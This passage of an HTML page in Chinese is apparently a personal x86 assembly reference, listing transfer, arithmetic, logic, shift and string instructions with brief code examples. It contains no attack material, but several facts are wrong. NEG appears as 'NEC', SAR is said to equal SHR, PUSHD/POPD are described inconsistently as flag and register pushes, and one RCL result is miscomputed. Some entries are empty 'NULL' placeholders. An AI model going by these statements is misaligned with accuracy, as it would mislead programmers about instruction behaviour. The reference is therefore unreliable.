href="#BSWAP-交换32位寄存器里字节的顺序" class="headerlink" title="BSWAP 交换32位寄存器里字节的顺序"></a>BSWAP 交换32位寄存器里字节的顺序</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">;EAX=96688368HBSWAP EAX;EAX=68836896H<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="XCHG-交换字或字节-至少有一个操作数为寄存器-段寄存器不可作为操作数"><a href="#XCHG-交换字或字节-至少有一个操作数为寄存器-段寄存器不可作为操作数" class="headerlink" title="XCHG 交换字或字节( 至少有一个操作数为寄存器,段寄存器不可作为操作数)"></a>XCHG 交换字或字节( 至少有一个操作数为寄存器,段寄存器不可作为操作数)</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">xchg ax,hxxchg ah,alxchg eax,ebxxchg var,ax;var16位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CMPXCHG-比较并交换操作数-第二个操作数必须为累加器AL-AX-EAX"><a href="#CMPXCHG-比较并交换操作数-第二个操作数必须为累加器AL-AX-EAX" class="headerlink" title="CMPXCHG 比较并交换操作数( 第二个操作数必须为累加器AL/AX/EAX )"></a>CMPXCHG 比较并交换操作数( 第二个操作数必须为累加器AL/AX/EAX )</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">CMPXCHG CX,DX;如果指令执行前 (AX)=2300H,(CX)=2300H.(DX)=2400H;则指令执行后 因（CX）=(AX),故(CX)=2400H,ZF=1;如果指令执行前（AX）=2500H,(CX)=2300H,(DX)=2400H;则指令执行后因（CX）!=(AX)，故(AX)=2300H，ZF=0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="XADD-先交换再累加-结果在第一个操作数里"><a href="#XADD-先交换再累加-结果在第一个操作数里" class="headerlink" title="XADD 先交换再累加( 结果在第一个操作数里 )"></a>XADD 先交换再累加( 结果在第一个操作数里 )</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">xadd eax，ecx;相当于：先执行：xchg eax,ecx然后执行：add eax,ecx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="XLAT-字节查表转换"><a href="#XLAT-字节查表转换" class="headerlink" title="XLAT 字节查表转换"></a>XLAT 字节查表转换</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">X DW 1122h,3344h,5566h,7788hlea bx,Xmov al,03hxlat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>BX 指向一张 256 字节的表的起点, AL 为表的索引值 (0-255,即 0-FFH); 返回 AL 为查表结果 ( [BX+AL]-&gt;AL )</p><h1 id="输入输出端口传送指令"><a href="#输入输出端口传送指令" class="headerlink" title="输入输出端口传送指令"></a>输入输出端口传送指令</h1><h3 id="IN-I-O端口输入"><a href="#IN-I-O端口输入" class="headerlink" title="IN I/O端口输入"></a>IN I/O端口输入</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">语法: IN 累加器, {端口号│DX}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="OUT-I-O端口输出"><a href="#OUT-I-O端口输出" class="headerlink" title="OUT I/O端口输出"></a>OUT I/O端口输出</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">语法: OUT {端口号│DX},累加器<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="输入输出端口由立即方式指定时-其范围是-0-255-由寄存器-DX-指定时-其范围是-0-65535"><a href="#输入输出端口由立即方式指定时-其范围是-0-255-由寄存器-DX-指定时-其范围是-0-65535" class="headerlink" title="输入输出端口由立即方式指定时, 其范围是 0-255; 由寄存器 DX 指定时,其范围是 0-65535"></a>输入输出端口由立即方式指定时, 其范围是 0-255; 由寄存器 DX 指定时,其范围是 0-65535</h3><h1 id="目的地址传送指令"><a href="#目的地址传送指令" class="headerlink" title="目的地址传送指令"></a>目的地址传送指令</h1><h3 id="LEA-装入有效地址"><a href="#LEA-装入有效地址" class="headerlink" title="LEA 装入有效地址"></a>LEA 装入有效地址</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">LEA DX,string ;把偏移地址存到DX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="LDS-传送目标指针-把指针内容装入DS"><a href="#LDS-传送目标指针-把指针内容装入DS" class="headerlink" title="LDS 传送目标指针,把指针内容装入DS"></a>LDS 传送目标指针,把指针内容装入DS</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">LDS SI,string ;把段地址:偏移地址存到DS:SI<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="LES-传送目标指针-把指针内容装入ES"><a href="#LES-传送目标指针-把指针内容装入ES" class="headerlink" title="LES 传送目标指针,把指针内容装入ES"></a>LES 传送目标指针,把指针内容装入ES</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">LES DI,string ;把段地址:偏移地址存到ESDI<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="LFS-传送目标指针-把指针内容装入FS"><a href="#LFS-传送目标指针-把指针内容装入FS" class="headerlink" title="LFS 传送目标指针,把指针内容装入FS"></a>LFS 传送目标指针,把指针内容装入FS</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">LFS DI,string ;把段地址:偏移地址存到FSD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="LGS-传送目标指针-把指针内容装入GS"><a href="#LGS-传送目标指针-把指针内容装入GS" class="headerlink" title="LGS 传送目标指针,把指针内容装入GS"></a>LGS 传送目标指针,把指针内容装入GS</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">LGS DI,string ;把段地址:偏移地址存到GSDI <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="LSS-传送目标指针-把指针内容装入SS"><a href="#LSS-传送目标指针-把指针内容装入SS" class="headerlink" title="LSS 传送目标指针,把指针内容装入SS"></a>LSS 传送目标指针,把指针内容装入SS</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">LSS DI,string ;把段地址:偏移地址存到SSDI<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="标志传送指令"><a href="#标志传送指令" class="headerlink" title="标志传送指令"></a>标志传送指令</h1><h3 id="LAHF-标志寄存器传送-把标志装入AH"><a href="#LAHF-标志寄存器传送-把标志装入AH" class="headerlink" title="LAHF 标志寄存器传送,把标志装入AH"></a>LAHF 标志寄存器传送,把标志装入AH</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">.data    saveflags byte ?.code    lahf    mov saveflags,ah<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SAHF-标志寄存器传送-把AH内容装入标志寄存器"><a href="#SAHF-标志寄存器传送-把AH内容装入标志寄存器" class="headerlink" title="SAHF 标志寄存器传送,把AH内容装入标志寄存器"></a>SAHF 标志寄存器传送,把AH内容装入标志寄存器</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ah,saveflags    sahf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="PUSHF-标志入栈"><a href="#PUSHF-标志入栈" class="headerlink" title="PUSHF 标志入栈"></a>PUSHF 标志入栈</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">pushf;保存标志寄存器内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="POPF-标志出栈"><a href="#POPF-标志出栈" class="headerlink" title="POPF 标志出栈"></a>POPF 标志出栈</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">popf;恢复标志寄存器内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PUSHD-32位标志入栈"><a href="#PUSHD-32位标志入栈" class="headerlink" title="PUSHD 32位标志入栈"></a>PUSHD 32位标志入栈</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">pushd;保存32通用寄存器内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="POPD-32位标志出栈"><a href="#POPD-32位标志出栈" class="headerlink" title="POPD 32位标志出栈"></a>POPD 32位标志出栈</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">popd;恢复32通用寄存器内存<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="算术运算指令"><a href="#算术运算指令" class="headerlink" title="算术运算指令"></a>算术运算指令</h1><h3 id="ADD-加法"><a href="#ADD-加法" class="headerlink" title="ADD 加法"></a>ADD 加法</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov eax,1add eax,12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="ADC-带进位加法"><a href="#ADC-带进位加法" class="headerlink" title="ADC 带进位加法"></a>ADC 带进位加法</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov dl,0mov al,0FFhadd al,0FFh;AL=FEhadc dl,0;DL/AL=01FEh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="INC-加-1"><a href="#INC-加-1" class="headerlink" title="INC 加 1"></a>INC 加 1</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ax,1inc ax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="AAA-加法的ASCII码调整"><a href="#AAA-加法的ASCII码调整" class="headerlink" title="AAA 加法的ASCII码调整"></a>AAA 加法的ASCII码调整</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ah,0mov al,'8';AX=0038hadd al,'2';AX=006Ahaaa;AX=0100h(结果进行ASCII转换)or ax,3030h;AX=3130h='10'(转换为ASCII码)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="DAA-加法的十进制调整"><a href="#DAA-加法的十进制调整" class="headerlink" title="DAA 加法的十进制调整"></a>DAA 加法的十进制调整</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,35hadd al,48h;AL=7Dhdaa;AL=83h(调整后结果)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="SUB-减法"><a href="#SUB-减法" class="headerlink" title="SUB 减法"></a>SUB 减法</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,23sub al,3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="SBB-带借位减法"><a href="#SBB-带借位减法" class="headerlink" title="SBB 带借位减法"></a>SBB 带借位减法</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov edx,7;高32位mov eax,1;低32位sub eax，2sbb edx，0;高32位减法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="DEC-减-1"><a href="#DEC-减-1" class="headerlink" title="DEC 减 1"></a>DEC 减 1</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">dec al<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="NEC-求反-以-0-减之"><a href="#NEC-求反-以-0-减之" class="headerlink" title="NEC 求反(以 0 减之)"></a>NEC 求反(以 0 减之)</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">nec al<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="CMP-比较-两操作数作减法-仅修改标志位-不回送结果"><a href="#CMP-比较-两操作数作减法-仅修改标志位-不回送结果" class="headerlink" title="CMP 比较.(两操作数作减法,仅修改标志位,不回送结果)"></a>CMP 比较.(两操作数作减法,仅修改标志位,不回送结果)</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ax,5cmp ax,10;ZF=0 and CF=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="AAS-减法的ASCII码调整"><a href="#AAS-减法的ASCII码调整" class="headerlink" title="AAS 减法的ASCII码调整"></a>AAS 减法的ASCII码调整</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ah,0mov al,'8';AX=0038hsub al,'9';AX=00FFhaas;AX=FF09hpushfor al,30h;AX=FF39hpopf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="DAS-减法的十进制调整"><a href="#DAS-减法的十进制调整" class="headerlink" title="DAS 减法的十进制调整"></a>DAS 减法的十进制调整</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov bl,48hmov al,85hsub al,bl;AL=3Dhdas;AL=37h(调整后结果)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="MUL-无符号乘法"><a href="#MUL-无符号乘法" class="headerlink" title="MUL 无符号乘法"></a>MUL 无符号乘法</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var word 0100hmov ax,2000h;AX=2000h;AX存储结果mul 0100h/var;DX:AX=00200000h,CF=1;32位EDX:EAX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="IMUL-整数乘法"><a href="#IMUL-整数乘法" class="headerlink" title="IMUL 整数乘法"></a>IMUL 整数乘法</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ax,48mov bx,4imul bx;DX:AX=000000C0h,OF=0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="以上两条-结果回送AH和AL-字节运算-或DX和AX-字运算"><a href="#以上两条-结果回送AH和AL-字节运算-或DX和AX-字运算" class="headerlink" title="以上两条,结果回送AH和AL(字节运算),或DX和AX(字运算)"></a>以上两条,结果回送AH和AL(字节运算),或DX和AX(字运算)</h3><h3 id="AAM-乘法的ASCII码调整"><a href="#AAM-乘法的ASCII码调整" class="headerlink" title="AAM 乘法的ASCII码调整"></a>AAM 乘法的ASCII码调整</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var byte 05h,06hmov bl,var;第一个操作数mov bl,[var+1];第二个操作数mul bl;AX=001Ehaam;AX=0300h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="DIV-无符号除法"><a href="#DIV-无符号除法" class="headerlink" title="DIV 无符号除法"></a>DIV 无符号除法</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ax,0083h;被除数mov bl,2;除数div bl;AL=41h,AH=01h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="IDIV-整数除法"><a href="#IDIV-整数除法" class="headerlink" title="IDIV 整数除法"></a>IDIV 整数除法</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var sword -101;009Bhmov dx,0mov ax,var;DX:AX=0000009Bh(+155)mov bx,2;BX是除数idiv bx;DX:AX除以BX    var sword -48mov al,var;被除数低字节cbw；AL扩展到AHmov bl,+5;除数idiv bl;AL=-9,AH=-3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="以上两条-结果回送"><a href="#以上两条-结果回送" class="headerlink" title="以上两条,结果回送:"></a>以上两条,结果回送:</h3><h3 id="商回送AL-余数回送AH-字节运算-或商回送AX-余数回送DX-字运算"><a href="#商回送AL-余数回送AH-字节运算-或商回送AX-余数回送DX-字运算" class="headerlink" title="商回送AL,余数回送AH, (字节运算);或商回送AX,余数回送DX, (字运算)"></a>商回送AL,余数回送AH, (字节运算);或商回送AX,余数回送DX, (字运算)</h3><h3 id="AAD-除法的ASCII码调整"><a href="#AAD-除法的ASCII码调整" class="headerlink" title="AAD 除法的ASCII码调整"></a>AAD 除法的ASCII码调整</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var byte ?var2 byte ?mov ax,0307h;被除数aad;AX=0025hmov bl,5;除数div bl;AX=0207hmov var,almov var2,ah<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CBW-字节转换为字-把AL中字节的符号扩展到AH中去"><a href="#CBW-字节转换为字-把AL中字节的符号扩展到AH中去" class="headerlink" title="CBW 字节转换为字. (把AL中字节的符号扩展到AH中去)"></a>CBW 字节转换为字. (把AL中字节的符号扩展到AH中去)</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var sword -101;9Bhmov al,var;AL=9Bhcbw;AL=FF9Bh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="CWD-字转换为双字-把AX中的字的符号扩展到DX中去"><a href="#CWD-字转换为双字-把AX中的字的符号扩展到DX中去" class="headerlink" title="CWD 字转换为双字. (把AX中的字的符号扩展到DX中去)"></a>CWD 字转换为双字. (把AX中的字的符号扩展到DX中去)</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var sword -101;FF9Bhmov ax,var;AX=FF9Bhcwd;DX:AX=FFFFFF9Bh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="CWDE-字转换为双字-把AX中的字符号扩展到EAX中去"><a href="#CWDE-字转换为双字-把AX中的字符号扩展到EAX中去" class="headerlink" title="CWDE 字转换为双字. (把AX中的字符号扩展到EAX中去)"></a>CWDE 字转换为双字. (把AX中的字符号扩展到EAX中去)</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NULL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="CDQ-双字扩展-把EAX中的字的符号扩展到EDX中去"><a href="#CDQ-双字扩展-把EAX中的字的符号扩展到EDX中去" class="headerlink" title="CDQ 双字扩展. (把EAX中的字的符号扩展到EDX中去)"></a>CDQ 双字扩展. (把EAX中的字的符号扩展到EDX中去)</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">var sword -101;FFFFFF9Bhmov eax,var;EDX:EAX=FFFFFFFFFFFFFF9Bhcdq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="逻辑运算指令"><a href="#逻辑运算指令" class="headerlink" title="逻辑运算指令"></a>逻辑运算指令</h1><h3 id="AND-与运算"><a href="#AND-与运算" class="headerlink" title="AND 与运算"></a>AND 与运算</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,10101110band al,11110110b;消除位0,3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="OR-或运算"><a href="#OR-或运算" class="headerlink" title="OR 或运算"></a>OR 或运算</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,11100011bor al,00000100b;位2置1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="XOR-异或运算"><a href="#XOR-异或运算" class="headerlink" title="XOR 异或运算"></a>XOR 异或运算</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,10110101bxor al,0;异或<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="NOT-取反"><a href="#NOT-取反" class="headerlink" title="NOT 取反"></a>NOT 取反</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,10101110bnot al;补集<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="TEST-测试-两操作数作与运算-仅修改标志位-不回送结果"><a href="#TEST-测试-两操作数作与运算-仅修改标志位-不回送结果" class="headerlink" title="TEST 测试(两操作数作与运算,仅修改标志位,不回送结果)"></a>TEST 测试(两操作数作与运算,仅修改标志位,不回送结果)</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">test al,00001001b;测试0,3位<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SHL-逻辑左移-位元乘法"><a href="#SHL-逻辑左移-位元乘法" class="headerlink" title="SHL 逻辑左移,位元乘法"></a>SHL 逻辑左移,位元乘法</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov bl,8Fh;BL=10001111bshl bl,1;CF=1,BL=00011110b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="SAL-算术左移-SHL"><a href="#SAL-算术左移-SHL" class="headerlink" title="SAL 算术左移(=SHL)"></a>SAL 算术左移(=SHL)</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">sal/shl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SHR-逻辑右移，位元除法"><a href="#SHR-逻辑右移，位元除法" class="headerlink" title="SHR 逻辑右移，位元除法"></a>SHR 逻辑右移，位元除法</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,0D0h;AL=11010000bshr al,1;AL=01101000b,CF=0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="SAR-算术右移-SHR"><a href="#SAR-算术右移-SHR" class="headerlink" title="SAR 算术右移(=SHR)"></a>SAR 算术右移(=SHR)</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">sar/shr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ROL-循环左移"><a href="#ROL-循环左移" class="headerlink" title="ROL 循环左移"></a>ROL 循环左移</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">mov al,40h;AL=01000000brol al,1;AL=10000000brol al,3;AL=00000100b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ROR-循环右移"><a href="#ROR-循环右移" class="headerlink" title="ROR 循环右移"></a>ROR 循环右移</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,01h;AL=00000001bror al,1;AL=10000000bror al,3;AL=00010000b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="RCL-通过进位的循环左移"><a href="#RCL-通过进位的循环左移" class="headerlink" title="RCL 通过进位的循环左移"></a>RCL 通过进位的循环左移</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">clc;CF=0mov bl,88h;CF,BL=0 10001000brcl bl,1;CF,BL=1 00010000brcl bl,1;CF,BL=0 00100010b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="RCR-通过进位的循环右移"><a href="#RCR-通过进位的循环右移" class="headerlink" title="RCR 通过进位的循环右移"></a>RCR 通过进位的循环右移</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">stc ;CF=1mov ah,10h;AH,CF=00010000 1rcr ah,1;AH,CF=10001000 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以上八种移位指令,其移位次数可达255次</p><p>移位一次时, 可直接用操作码. 如 SHL AX,1</p><p>移位&gt;1次时, 则由寄存器CL给出移位次数</p><p>如 MOV CL,04 SHL AX,CL</p><h3 id="SHLD-双精度左移"><a href="#SHLD-双精度左移" class="headerlink" title="SHLD 双精度左移"></a>SHLD 双精度左移</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">wval word 9BA6hmov ax,0AC36hshld wval,ax,4;wval=BA6Ah,将wval左移4位，并把AX的高4位插入wval的低4位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="SHRD-双精度右移"><a href="#SHRD-双精度右移" class="headerlink" title="SHRD 双精度右移"></a>SHRD 双精度右移</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ax,234Bhmov dx,7654hshrd ax,dx,4;AX右移4位，并把DX的低4位插入AX的高4位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="串指令"><a href="#串指令" class="headerlink" title="串指令"></a>串指令</h1><h3 id="DS-SI-源串段寄存器-源串变址"><a href="#DS-SI-源串段寄存器-源串变址" class="headerlink" title="DS:SI 源串段寄存器 :源串变址"></a>DS:SI 源串段寄存器 :源串变址</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NULL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ESI-目标串段寄存器-目标串变址"><a href="#ESI-目标串段寄存器-目标串变址" class="headerlink" title="ESI 目标串段寄存器:目标串变址"></a>ESI 目标串段寄存器:目标串变址</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NULL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="CX-重复次数计数器"><a href="#CX-重复次数计数器" class="headerlink" title="CX 重复次数计数器"></a>CX 重复次数计数器</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NULL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="AL-AX-扫描值"><a href="#AL-AX-扫描值" class="headerlink" title="AL/AX 扫描值"></a>AL/AX 扫描值</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NULL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="D标志-0表示重复操作中SI和DI应自动增量-1表示应自动减量"><a href="#D标志-0表示重复操作中SI和DI应自动增量-1表示应自动减量" class="headerlink" title="D标志 0表示重复操作中SI和DI应自动增量; 1表示应自动减量"></a>D标志 0表示重复操作中SI和DI应自动增量; 1表示应自动减量</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NULL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Z标志-用来控制扫描或比较操作的结束"><a href="#Z标志-用来控制扫描或比较操作的结束" class="headerlink" title="Z标志 用来控制扫描或比较操作的结束"></a>Z标志 用来控制扫描或比较操作的结束</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NULL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MOVS-串传送-MOVSB-传送字符-MOVSW-传送字-MOVSD-传送双字"><a href="#MOVS-串传送-MOVSB-传送字符-MOVSW-传送字-MOVSD-传送双字" class="headerlink" title="MOVS 串传送   ( MOVSB 传送字符 MOVSW 传送字 MOVSD 传送双字 )"></a>MOVS 串传送   ( MOVSB 传送字符 MOVSW 传送字 MOVSD 传送双字 )</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">;传送字符串数据：将ESI寻址的内存数据复制到EDI寻址的内存位置;复制双字数值source dword 20 dup(0FFFFFFFh)target dword 20 dup(?).codecld;方向为正mov ecx,lengthof source;设置REP计数器mov esi,offset source;ESI指向sourcemov edi,offset target;EDI指向targetrep movsd;复制双字<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CMPS-串比较-CMPSB-比较字符-CMPSW-比较字"><a href="#CMPS-串比较-CMPSB-比较字符-CMPSW-比较字" class="headerlink" title="CMPS 串比较   ( CMPSB 比较字符 CMPSW 比较字 )"></a>CMPS 串比较   ( CMPSB 比较字符 CMPSW 比较字 )</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">;比较字符串：比较分别由ESI和EDI寻址的内存数据;比较双字mov esi OFFSET sourcemov edi ,OFFSET targetcld;方向为正向mov ecx, LENGTHOF source;设置重复计数器repe cmpsd;相等则重复<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SCAS-串扫描-把AL或AX的内容与目标串作比较-比较结果反映在标志位"><a href="#SCAS-串扫描-把AL或AX的内容与目标串作比较-比较结果反映在标志位" class="headerlink" title="SCAS 串扫描    把AL或AX的内容与目标串作比较,比较结果反映在标志位"></a>SCAS 串扫描    把AL或AX的内容与目标串作比较,比较结果反映在标志位</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">;扫描字符串：比较累加器（AL、AX和EAX）与EDI寻址的内存数据;扫描是否有匹配字符alpha BYTE "ABCDEFGH",0.codemov edi,OFFSET alpha;EDI指向字符串mov al,'F';检索字符Fmov ecx,LENGTHOF alpha;设置检索计数器cld;方向为正向repne scasb;不相等则重复jnz quit;若未发现字符则退出dec edi;发现字符: EDI减1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="LODS-装入串-把源串中的元素-字或字节-逐一装入AL或AX中-LODSB-传送字符-LODSW-传送字-LODSD-传送双字"><a href="#LODS-装入串-把源串中的元素-字或字节-逐一装入AL或AX中-LODSB-传送字符-LODSW-传送字-LODSD-传送双字" class="headerlink" title="LODS 装入串    把源串中的元素(字或字节)逐一装入AL或AX中( LODSB 传送字符 LODSW 传送字 LODSD 传送双字 )"></a>LODS 装入串    把源串中的元素(字或字节)逐一装入AL或AX中( LODSB 传送字符 LODSW 传送字 LODSD 传送双字 )</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">;从字符串加载到累加器：将ESI寻址的内存数据加载到累加器;数组乘法:本程序将一个32位整数数组中的每个元素都乘以一个常数。INCLUDE Irvine32. inc.dataarray DWORD 1,2,3,4,5,6,7,8,9,10;测试数据multiplier DWORD 10;测试数据.codemain PROC    cld;方向为正向    mov esi,OFFSET array;源数组索引    mov edi,esi;目标数组索引    mov ecx,LENGTHOF array;循环计数器Ll: lodsd;将[ESI]加载到EAX    mul multiplier;与常数相乘    stosd;将EAX保存到[EDI]    loop Ll    exitmain ENDPEND main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="STOS-保存串-是LODS的逆过程"><a href="#STOS-保存串-是LODS的逆过程" class="headerlink" 